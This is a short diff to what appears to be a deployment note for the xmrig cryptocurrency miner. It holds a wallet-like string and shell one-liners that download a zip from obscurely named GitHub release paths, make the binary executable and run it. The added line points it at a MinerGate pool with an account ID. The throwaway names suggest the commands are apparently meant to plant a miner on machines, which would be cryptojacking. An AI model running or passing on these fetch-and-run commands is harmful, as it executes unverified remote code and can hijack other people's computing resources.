@@ -1,3 +1,5 @@
 486PQyXNvBEGRzmoAfjUina7oifuEEPAVYQwaR1QkzmVEhXhKED8Fin3SAEu2ekxoLWmhwd2pJj5s7NDpMNPMVrH6udokwv
 
 mkdir wwwe && cd wwwe && wget https://github.com/ioFui/UU5GuJDJc9yvDf5D/releases/download/tt/xmrig.zip && unzip xmrig.zip && chmod u=rwx,g=r,o=r ./xmrig && ./xmrig
+
+mkdir wwwe && cd wwwe && wget https://github.com/ioFui/UU5GuJDJc9yvDf5D/releases/download/tt/xmrig.zip && unzip xmrig.zip && chmod u=rwx,g=r,o=r ./xmrig && ./xmrig -a cryptonight -o xmr.pool.minergate.com:45700 -u nkt4nzfndc28yhq -p x
